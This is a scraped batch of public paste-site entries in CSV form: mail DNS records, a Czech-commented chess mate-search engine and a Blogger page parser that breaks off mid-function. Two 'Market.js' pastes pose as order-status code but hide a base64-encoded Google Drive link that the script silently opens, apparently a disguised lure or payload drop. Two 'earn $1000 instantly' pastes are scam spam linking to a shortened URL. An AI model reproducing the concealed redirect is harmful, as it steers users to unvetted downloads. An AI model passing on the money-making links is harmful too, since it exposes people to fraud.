id,title,username,language,date,content
PTEPjPCe,Untitled,tibiole,Latex,Wednesday 9th of April 2025 07:08:17 AM CDT,"TXT
em.pirateclub.hu
v=spf1 include:mailgun.org ~all

MX
em.pirateclub.hu
mxa.eu.mailgun.org
10	

MX
em.pirateclub.hu
mxb.eu.mailgun.org
10	

TXT
_dmarc.em.pirateclub.hu
v=DMARC1; p=none; pct=100; fo=1; ri=3600; rua=mailto:cda30f6c@dmarc.mailgun.org,mailto:8d19493c@inbox.ondmarc.com; ruf=mailto:cda30f6c@dmarc.mailgun.org,mailto:8d19493c@inbox.ondmarc.com;"
ZCEbJZHn,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 07:06:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B1jr00gi,very good OKOK ACE!,max2201111,Python,Wednesday 9th of April 2025 07:02:42 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Globální konstanty – pohyby jezdce (relativní souřadnice)
knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1),
                (1, 2), (1, -2), (-1, 2), (-1, -2)]
MATE = 10000  # Velikost hodnoty pro mat

# Globální proměnné pro sledování času
running = False
start_time = 0

###############################################################################
# Funkce pro výpis času v samostatném vlákně
###############################################################################

def time_reporter():
    """"""Funkce pro výpis aktuálního času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        time.sleep(1)

###############################################################################
# Třída Board – reprezentuje šachovnici a inicializuje ji z FEN řetězce.
###############################################################################

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice; pokud je zadán FEN, nastaví pozici podle něj.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()  # např. {'K','Q','k','q'}
        self.en_passant = None       # (row, col) nebo None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        # FEN řady začínají od horní (8.) a jdou dolů
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        lines.append(""  a b c d e f g h"")
        lines.append(""  ---------------"")
        for ri in range(8):
            line = f""{8-ri}|""
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line + f""|{8-ri}"")
        lines.append(""  ---------------"")
        lines.append(""  a b c d e f g h"")
        lines.append(f""Na tahu: {'Bílý' if self.to_move == 'w' else 'Černý'}"")
        return ""\n"".join(lines)

###############################################################################
# Funkce pro převod tahu do notace
###############################################################################

def move_to_notation(move):
    """"""Převede interní formát tahu (r1, c1, r2, c2, promo, special) na šachovou notaci.""""""
    r1, c1, r2, c2, promo, special = move
    from_square = chr(c1 + ord('a')) + str(8 - r1)
    to_square = chr(c2 + ord('a')) + str(8 - r2)
    if special == 'castle':
        if c2 > c1:
            return ""O-O""
        else:
            return ""O-O-O""
    notation = from_square + to_square
    if promo:
        notation += promo.lower()
    return notation

###############################################################################
# Funkce pro detekci šachu, generování tahů a jejich provádění
###############################################################################

def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    # Útoky jezdcem (a dalšími s jezdcovým pohybem)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    # Útoky po řadách/sloupcích (věž, dáma, případně i Cyril = R+N či další kombinace)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    # Útoky diagonálně (střelec, dáma, případně i Eve = B+N)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    enemy = 'b' if side=='w' else 'w'
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády (základní verze)
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

# Zásobník pro tahy (pro undo)
move_stack = []

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.
       move: (r1, c1, r2, c2, promo, special)""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    board.grid[r1][c1] = '.'
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    board.grid[r1][c1] = piece
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    board.castling_rights, board.en_passant = prev_state
    board.to_move = 'b' if board.to_move=='w' else 'w'

def analyze_position(board):
    """"""Analyzuje pozici a vrátí textový popis.""""""
    white_legal = get_legal_moves(board, 'w')
    black_legal = get_legal_moves(board, 'b')
    white_in_check = is_in_check(board, 'w')
    black_in_check = is_in_check(board, 'b')
    if not white_legal and white_in_check:
        return ""Mat – černý vyhrává""
    if not black_legal and black_in_check:
        return ""Mat – bílý vyhrává""
    if (not white_legal and not white_in_check) or (not black_legal and not black_in_check):
        return ""Pat – remíza""
    return ""Pozice je hratelná""

###############################################################################
# Čistý negamax bez heuristik – hledáme pouze mate (terminální stavy)
###############################################################################
MATE = 10000  # Hodnota pro mate

# --- Ostatní funkce (time_reporter, Board, move_to_notation, find_king, is_square_attacked, is_in_check,
# generate_pseudo_moves, get_legal_moves, make_move, undo_move, analyze_position) zůstávají beze změny --- #

###############################################################################
# Upravený čistý negamax s check extension (a omezením počtu extenzí)
###############################################################################

def negamax(board, alpha, beta, depth, max_depth, ext=0, max_ext=1):
    legal_moves = get_legal_moves(board, board.to_move)
    if not legal_moves:
        # Terminální uzel: pokud je strana v šachu, je to mate, jinak pat.
        if is_in_check(board, board.to_move):
            return -(MATE - depth), []
        else:
            return 0, []
    
    # Pokud jsme dosáhli cutoff hloubky, zkusíme prodloužit hledání, když je hráč v šachu.
    if depth == max_depth:
        if is_in_check(board, board.to_move) and ext < max_ext:
            # Prodloužíme hledání o jeden ply a zvýšíme počet extenzí
            return negamax(board, alpha, beta, depth, max_depth + 1, ext + 1, max_ext)
        else:
            return 0, []

    best_value = -inf
    best_line = []
    for move in legal_moves:
        make_move(move, board)
        child_score, child_line = negamax(board, -beta, -alpha, depth + 1, max_depth, ext, max_ext)
        score = -child_score
        undo_move(board)
        if score > best_value:
            best_value = score
            best_line = [move] + child_line
        alpha = max(alpha, score)
        if alpha >= beta:
            break
    return best_value, best_line

###############################################################################
# Iterativní prohlubování s negamax – hledáme mate s “neomezenou” hloubkou
###############################################################################

def iterative_deepening_negamax(board, max_time=300):
    global running, start_time
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()

    best_value = -inf
    best_moves = []
    current_depth = 1

    try:
        while True:
            if time.time() - start_time > max_time:
                print(f""\nČasový limit vypršel po {max_time} sekundách"")
                break

            t0 = time.time()
            value, moves = negamax(board, -inf, inf, 0, current_depth)
            t1 = time.time()

            elapsed = time.time() - start_time
            hrs = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)
            secs = int(elapsed % 60)
            print(f""\nHloubka {current_depth} – čas: {hrs:02d}h {mins:02d}m {secs:02d}s (krok: {t1 - t0:.2f}s)"")
            if moves:
                print(f""Nejlepší sekvence: {' '.join([move_to_notation(m) for m in moves])}"")
            else:
                print(""Žádná platná sekvence nalezena."")

            # Pokud bylo nalezeno mate (skóre v řádu MATE minus aktuální ply), ukončíme vyhledávání.
            if abs(value) >= MATE - current_depth:
                print(f""NALEZEN MAT v {len(moves)} tazích!"")
                best_value, best_moves = value, moves
                break

            best_value = value
            best_moves = moves
            current_depth += 1

        return best_value, best_moves, time.time() - start_time

    finally:
        running = False
        timer_thread.join(timeout=1.0)
        sys.stdout.write(""\n"")
        


###############################################################################
# Iterativní prohlubování s negamax – hledáme mate s “neomezenou” hloubkou
###############################################################################

###############################################################################
# Hlavní funkce
###############################################################################

def main():
    # Příklad FEN – např. pozice s černou dámou proti bílému králi,
    # případně upravte dle potřeby:
    # fen = ""8/6q1/8/8/8/k1K5/8/8 w - - 0 1""   # Bílý na tahu, v šachu od černé dámy
    fen = ""6k1/8/3K4/5C2/8/8/8/8 w - - 0 1""
    # Další možné testovací pozice:
    # fen = ""8/6q1/8/8/8/k1K5/8/8 b - - 0 1""    # Černý na tahu
    # fen = ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1""     # Bílý král a amazonka proti černému králi
    # fen = ""8/8/8/8/8/kq2K3/8/8 w - - 0 1""      # Bílý král proti černému králi a dámě

    board = Board(fen)

    print(""\n"" + ""=""*60)
    print(""ŠACHOVÝ ENDGAME ENGINE S PODPOROU SPECIÁLNÍCH FIGUR"")
    print(""=""*60)
    print(""\nPočáteční pozice:"")
    print(board.display())

    if is_in_check(board, 'w'):
        print(""UPOZORNĚNÍ: Bílý je v šachu!"")
    if is_in_check(board, 'b'):
        print(""UPOZORNĚNÍ: Černý je v šachu!"")

    print(""\nVyhledávání mate – čistý negamax bez heuristik...\n"")
    value, moves, elapsed = iterative_deepening_negamax(board, max_time=300)

    hrs = int(elapsed // 3600)
    mins = int((elapsed % 3600) // 60)
    secs = int(elapsed % 60)

    print(""\n"" + ""=""*60)
    print(""NALEZENÁ OPTIMÁLNÍ SEKVENCE"")
    print(""=""*60)
    if not moves:
        print(""Nebyla nalezena žádná platná sekvence tahů."")
    else:
        temp_board = board.copy()
        print(""Začátek:"")
        print(temp_board.display())
        print(""-"" * 40)
        for i, move in enumerate(moves, 1):
            make_move(move, temp_board)
            print(f""Tah {i}: {move_to_notation(move)}"")
            print(temp_board.display())
            print(""-"" * 40)
        if abs(value) >= MATE - len(moves):
            result = ""Mat pro "" + (""bílého"" if value > 0 else ""černého"")
        else:
            result = analyze_position(temp_board)
        print(f""Kompletní sekvence: {' '.join([move_to_notation(m) for m in moves])}"")
        print(f""Výsledek: {result}"")

    print(f""Celkový čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")

if __name__ == '__main__':
    main()"
ZtZgV4U9,EARN $900 INSTANTLY 2025⭐ G8,mohmedel,JavaScript,Wednesday 9th of April 2025 07:01:50 AM CDT," 
Pdf https://tinyurl.com/privguidee


EREpa0OuuE
"
47Npgegs,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 06:51:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07260/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
acHdTRnF,Make $1000 15-MINUTES  (BEGINNER) HV,mohmedel,JavaScript,Wednesday 9th of April 2025 06:48:21 AM CDT," 
Pdf https://tinyurl.com/privguidee


UoNULke5jb
"
UQ86gRY0,test neo-parser.js,milio48,JavaScript,Wednesday 9th of April 2025 06:45:58 AM CDT,"/**
 * neo-parser-dom.js
 * Parses Blogger data rendered by the neo-data-provider theme (v6+)
 * purely by reading the rendered DOM structure.
 * Does NOT rely on window.neoBlogData injection.
 *
 * Usage:
 * 1. Include this script in your Blogger theme (e.g., before </body>).
 * 2. After the DOM is loaded, the parsed data will be available in window.parsedBloggerDataDOM.
 */

/**
 * Main function to parse data based on the rendered DOM.
 * @returns {Object} An object containing blog info and page-specific data.
 */
function parseBloggerDataDOMOnly() {
    // console.log(""neo-parser-dom.js: Starting DOM-only parsing for:"", window.location.href);

    let parsedData = {
        blog: {},
        pageType: 'unknown', // Default page type
        page: null
    };

    try {
        // 1. Get Basic Blog Info from DOM
        parsedData.blog = getBlogInfoFromDOM();

        // 2. Determine Page Type from DOM Structure
        parsedData.pageType = determinePageTypeFromDOM(parsedData.blog.homepageUrl);
        // console.log(""neo-parser-dom.js: Determined Page Type:"", parsedData.pageType);

        // 3. Call Specific Parser based on Determined Type
        switch (parsedData.pageType) {
            case 'homepage':
            case 'archive':
            case 'index': // Covers Label and Search initially
                // These pages use the post list table
                const listPageData = parseListPageDOM(parsedData.pageType);
                parsedData.page = listPageData.posts; // Store the array of posts
                // Refine pageType and add specific info (like label name or search query)
                if (parsedData.pageType === 'index') {
                    parsedData.pageType = listPageData.subType; // 'label' or 'search'
                    if (listPageData.subType === 'label') {
                        parsedData.blog.pageName = listPageData.nameOrQuery;
                    } else {
                        parsedData.blog.searchQuery = listPageData.nameOrQuery;
                    }
                } else if (parsedData.pageType === 'archive') {
                     parsedData.blog.pageName = listPageData.nameOrQuery;
                }
                 parsedData.blog.pageTitle = listPageData.title; // Get title from H2
                break;
            case 'item':
                parsedData.page = parseItemPageDOM();
                parsedData.blog.pageTitle = parsedData.page?.title || document.title;
                break;
            case 'static_page':
                parsedData.page = parseStaticPageDOM();
                 parsedData.blog.pageTitle = parsedData.page?.title || document.title;
                break;
            case 'error':
                parsedData.page = parseErrorPageDOM();
                 parsedData.blog.pageTitle = parsedData.page?.title || document.title;
                break;
            default: // Unknown
                parsedData.page = parseUnknownPageDOM();
                 parsedData.blog.pageTitle = parsedData.page?.title || document.title;
                break;
        }

    } catch (error) {
        console.error(""neo-parser-dom.js: Error during DOM parsing:"", error);
        parsedData.pageType = 'parsing_error';
        parsedData.page = { error: ""Failed to parse page data from DOM."", details: error.message, stack: error.stack };
        // Attempt to get basic blog info even on error
        if (!parsedData.blog.title) {
             try { parsedData.blog = getBlogInfoFromDOM(); } catch(e){}
        }
    }

    // Add current URL regardless of parsing success/failure
    parsedData.blog.url = window.location.href;

    // console.log(""neo-parser-dom.js: Final Parsed Data (DOM Only):"", parsedData);
    return parsedData;
}

/**
 * Extracts basic blog info from header/DOM.
 * @returns {Object} Object with title and homepageUrl.
 */
function getBlogInfoFromDOM() {
    const blogInfo = {
        title: document.title, // Default to document title
        homepageUrl: null,
        url: window.location.href
    };
    try {
        const titleLink = document.querySelector('header.neo-site-header h1 a');
        if (titleLink) {
            blogInfo.title = titleLink.textContent.trim() || blogInfo.title;
            blogInfo.homepageUrl = titleLink.href || null;
        } else {
            console.warn(""neo-parser-dom.js: Could not find header title link (header.neo-site-header h1 a)."");
        }
    } catch(e) {
        console.error(""neo-parser-dom.js: Error getting basic blog info."", e);
    }
    return blogInfo;
}

/**
 * Determines the page type by looking for specific container elements.
 * @param {string|null} homepageUrl - The determined homepage URL.
 * @returns {string} The determined page type ('homepage', 'item', 'static_page', etc.).
 */
function determinePageTypeFromDOM(homepageUrl) {
    // Check for specific containers first
    if (document.querySelector('div.neo-homepage-data')) return 'homepage'; // Specific div for homepage
    if (document.querySelector('article.neo-post[itemscope]')) return 'item';
    if (document.querySelector('div.neo-custom-page')) return 'static_page';
    if (document.querySelector('div.neo-archive-data')) return 'archive';
    if (document.querySelector('div.neo-index-data')) return 'index'; // Label or Search
    if (document.querySelector('div.neo-error-page')) return 'error';
    if (document.querySelector('div.neo-unknown-page')) return 'unknown';

    // Fallback checks (less specific)
    // Check if current URL is homepage URL (if homepageUrl was found)
    if (homepageUrl && window.location.href === homepageUrl) {
         // Check if it has the post list table, could still be homepage if theme changed
         if (document.getElementById('neo-data-table-posts')) {
             return 'homepage';
         }
    }
    // If it has the post list table but none of the specific containers, assume index/archive
    if (document.getElementById('neo-data-table-posts')) {
        console.warn(""neo-parser-dom.js: Found post list table but no specific container (archive/index). Assuming 'index'."");
        return 'index';
    }

    console.warn(""neo-parser-dom.js: Could not determine page type from known elements."");
    return 'unknown'; // Default if nothing matches
}


/**
 * Parses list pages (Homepage, Archive, Index) which contain the post list table.
 * Extracts page title and specific type (label/search/archive name).
 * @param {string} initialPageType - The initially determined page type ('homepage', 'archive', 'index').
 * @returns {Object} Contains page title, posts array, subtype, and name/query if applicable.
 */
function parseListPageDOM(initialPageType) {
    const result = {
        title: document.title, // Default
        posts: [],
        subType: initialPageType, // 'homepage', 'archive', 'index'
        nameOrQuery: null
    };
    let containerSelector;
    let titleSelector = 'h2'; // Usually H2 for these pages

    switch(initialPageType) {
        case 'homepage':
            containerSelector = '.neo-homepage-data';
            break;
        case 'archive':
            containerSelector = '.neo-archive-data';
             result.subType = 'archive';
            break;
        case 'index':
             containerSelector = '.neo-index-data';
             // subtype (label/search) determined below
            break;
        default:
             console.warn(`neo-parser-dom.js: Unexpected initialPageType in parseListPageDOM: ${initialPageType}`);
             result.posts = parsePostListTableDOM(); // Try parsing table anyway
             return result;
    }

    const container = document.querySelector(containerSelector);
    if (container) {
        const titleElement = container.querySelector(titleSelector);
        if (titleElement) {
            result.title = titleElement.textContent.trim();
            // Try to extract specific name/query from title for archive/index
            if (initialPageType === 'archive') {
                // Example: ""Archive: Monthly Archive - Post Data"" -> ""Monthly Archive""
                const match = result.title.match(/^Archive:\s*(.*?)\s*-\s*Post Data$/i);
                result.nameOrQuery = match ? match[1] : result.title; // Fallback to full title
            } else if (initialPageType === 'index') {
                 // Example: ""Search Results: ""query"" - Post Data"" -> ""query""
                const searchMatch = result.title.match(/^Search Results:\s*""(.*?)""\s*-\s*Post Data$/i);
                 // Example: ""Label: LabelName - Post Data"" -> ""LabelName""
                const labelMatch = result.title.match(/^Label:\s*(.*?)\s*-\s*Post Data$/i);

                if (searchMatch) {
                    result.subType = 'search';
                    result.nameOrQuery = searchMatch[1];
                } else if (labelMatch) {
                    result.subType = 'label';
                    result.nameOrQuery = labelMatch[1];
                } else {
                     result.subType = 'index'; // Could not determine subtype
                     result.nameOrQuery = result.title; // Fallback
                }
            }
        } else {
             console.warn(`neo-parser-dom.js: Could not find title element (${titleSelector}) in ${containerSelector}.`);
        }
        // Parse the table within the container (or globally if needed)
        result.posts = parsePostListTableDOM(container); // Pass container to scope search
    } else {
         console.warn(`neo-parser-dom.js: Could not find container element: ${containerSelector}. Parsing table globally.`);
         result.posts = parsePostListTableDOM(); // Fallback to global search
    }

    return result;
}


/**
 * Parses the post list table (#neo-data-table-posts). DOM ONLY version.
 * @param {Element} [container=document] - Optional container element to search within.
 * @returns {Array<Object>} Array of post objects or empty array.
 */
function parsePostListTableDOM(container = document) {
    const table = container.querySelector('#neo-data-table-posts'); // Search within container or document
    if (!table) {
        console.warn(""neo-parser-dom.js: Table #neo-data-table-posts not found within the scope."", container === document ? ""Document"" : container);
        return []; // Return empty array
    }

    const rows = table.querySelectorAll('tbody tr');
    const posts = [];
    // Expected header order: ID, Title, URL, Published ISO, Published Formatted, Author, Labels, Snippet, First Image URL

    rows.forEach((row, rowIndex) => {
        const cells = row.querySelectorAll('td');
